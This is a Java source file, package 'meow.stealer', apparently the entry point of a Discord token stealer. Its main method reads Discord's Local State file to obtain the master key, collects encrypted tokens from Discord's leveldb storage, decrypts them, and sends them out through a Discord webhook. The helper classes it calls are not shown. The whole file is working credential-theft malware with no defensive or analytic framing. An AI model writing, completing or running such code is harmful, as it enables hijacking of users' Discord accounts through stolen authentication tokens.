package meow.stealer;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import java.io.IOException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;

public class Main {
    public static void main(String[] args) throws IOException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
        String appData = System.getenv("APPDATA");
        String path = appData + "\\discord\\Local Storage\\leveldb\\";
        String localState = appData + "\\discord\\Local State";
        String masterKey = ExtractMasterKey.masterKey(localState);
        List<String> encryptedTokens = ExtractToken.token(path);
        List<String> tokens = new ArrayList<>();
        for (String token : encryptedTokens) {
            String temp = Decryption.decrypt(masterKey, Base64.getDecoder().decode(token));
            tokens.add(Base64.getEncoder().encodeToString(temp.getBytes()));
        }


        DiscordWebhook webhook = new DiscordWebhook("");
        webhook.setContent(tokens.toString());
        webhook.setAvatarUrl("image.example/example.png");
        webhook.setUsername("example");
        webhook.execute(); //Handle exception
    }
}